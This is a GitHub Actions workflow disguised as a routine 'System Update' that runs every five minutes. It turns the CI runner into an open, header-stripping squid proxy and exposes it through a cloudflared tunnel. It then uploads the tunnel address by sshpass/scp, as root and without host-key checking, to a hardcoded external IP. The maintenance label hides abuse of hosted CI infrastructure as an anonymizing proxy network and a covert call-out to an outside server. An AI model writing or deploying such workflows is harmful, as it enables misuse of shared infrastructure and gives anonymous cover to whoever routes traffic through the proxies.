name: System Update

on:
  workflow_dispatch:
  schedule:
    - cron: '*/5 * * * *'

jobs:
  maintenance:
    runs-on: ubuntu-latest
    steps:
      - name: Install squid
        run: sudo apt update && sudo apt install squid -y

      - name: Config squid
        run: |
          sudo bash -c 'cat > /etc/squid/squid.conf << EOF
          http_port 3128
          http_access allow all
          forwarded_for off
          via off
          EOF'
          sudo systemctl restart squid

      - name: Install cloudflared
        run: |
          curl -L https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -o cloudflared
          chmod +x cloudflared
          sudo mv cloudflared /usr/local/bin/

      - name: Start tunnel
        run: |
          cloudflared tunnel --url http://localhost:3128 --protocol http2 > cloudflared.log 2>&1 &
          sleep 15
          cat cloudflared.log

      - name: Get address and upload
        env:
          REM: ${{ secrets.REM }}
        run: |
          PUBLIC_URL=$(grep -o 'https://[-a-zA-Z0-9]*\.trycloudflare\.com' cloudflared.log | head -1)
          if [ -z "${PUBLIC_URL}" ]; then
            echo "ERROR: No tunnel address found"
            exit 1
          fi
          PROXY_HOST=$(echo "${PUBLIC_URL}" | sed 's|https://||')
          echo "${PROXY_HOST}:443" > /tmp/proxy.txt
          cat /tmp/proxy.txt
          sudo apt install sshpass -y
          sshpass -p "${REM}" scp -o StrictHostKeyChecking=no /tmp/proxy.txt root@45.144.53.63:/var/www/html/git_enemy3civil.txt
          sleep 400
